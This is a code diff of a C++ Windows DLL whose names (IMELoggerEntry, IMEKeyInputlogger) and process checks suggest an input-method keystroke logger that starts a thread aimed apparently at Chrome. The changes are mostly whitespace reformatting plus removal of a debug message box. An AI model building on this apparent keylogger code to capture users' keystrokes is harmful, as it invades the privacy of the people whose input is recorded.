@@ -45,10 +45,10 @@ extern "C" __declspec(dllexport) void CALLBACK IMELoggerEntry(HWND hwnd, HINSTAN
 	ExitProcess(0);
 }
 
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
 {
 
 	HANDLE hThread = NULL;
@@ -58,16 +58,15 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	wchar_t targetProcessName[] = L"rundll32.exe";
 	wchar_t debugProcessName[] = L"WMIdorce.exe";
 
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
 		initializeLogger();
 
 		hProcess = GetCurrentProcess();
 		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
 		{
-			if (_wcsicmp(processName, targetProcessName)!= 0) {
-				MessageBoxW(NULL, L"OwO\n ", L"IMELoggerEntry", MB_OK);
+			if (_wcsicmp(processName, targetProcessName) != 0) {
 				IMEKeyInputlogger(L"\nYee\n");
 				// New thread for chromeMain
 				hThread = CreateThread(
@@ -87,20 +86,20 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 					// success to create thread
 					MessageBoxW(NULL, L"Success to create thread\n ", L"IMELoggerEntry", MB_OK);
 				}
-				
+
 			}
 			else {
-			
+
 			}
 		}
 
 		break;
-    case DLL_THREAD_ATTACH:
+	case DLL_THREAD_ATTACH:
 		break;
-    case DLL_THREAD_DETACH:
+	case DLL_THREAD_DETACH:
 		break;
-    case DLL_PROCESS_DETACH:
-		
+	case DLL_PROCESS_DETACH:
+
 		Logger::getInstance().closeAll();
 
 		if (hThread != NULL) {
@@ -108,9 +107,9 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 			CloseHandle(hThread);
 			hThread = NULL;
 		}
-		
-        break;
-    }
-    return TRUE;
+
+		break;
+	}
+	return TRUE;
 }
 
